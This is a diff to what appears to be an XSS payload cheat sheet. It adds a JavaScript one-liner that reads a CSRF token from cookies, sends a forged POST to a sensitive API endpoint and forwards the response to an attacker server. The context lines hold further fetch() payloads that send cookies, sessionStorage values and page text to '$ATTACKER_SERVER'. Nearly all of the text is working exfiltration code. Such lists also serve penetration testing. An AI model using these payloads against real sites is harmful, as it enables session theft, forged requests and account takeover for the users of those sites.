@@ -27,6 +27,10 @@ fetch("https://$ATTACKER_SERVER/?exfil="+sessionStorage.getItem("$ITEM_FROM_LOCA
 ```javascript
 fetch("https://$ATTACKER_SERVER/?exfil="+document.cookie)
 ```
+### GET COOKIES AND POST $FETCH AND SEND RESPONSE (Good for exfiltrating data from response pages or where you might not be able to compromise cookies but leverage a CSRF token thats accessible)
+```javascript
+var data ={"YOUR_JSON":"SOMEVALUE"};var value=('; '+document.cookie).split(`; CSRF-TOKEN=`).pop().split(';')[0];fetch('/SENSITIVE_API_ENDPOINT',{method:'POST',headers: {'X-CSRF-Token':value,'Content-Type':'application/json;charset=utf-8',},body:JSON.stringify(data),}).then(response=>response.json()).then(data =>{fetch("https://{ATTACKER_SERVER}/key?"+JSON.stringify(data));});
+```
 ### GET TEXT FROM PAGE AND $FETCH *(might be constrained by data length - use .slice() to shorten)*
 ```javascript
 fetch("https://$ATTACKER_SERVER/?exfil="+document.documentElement.outerText)
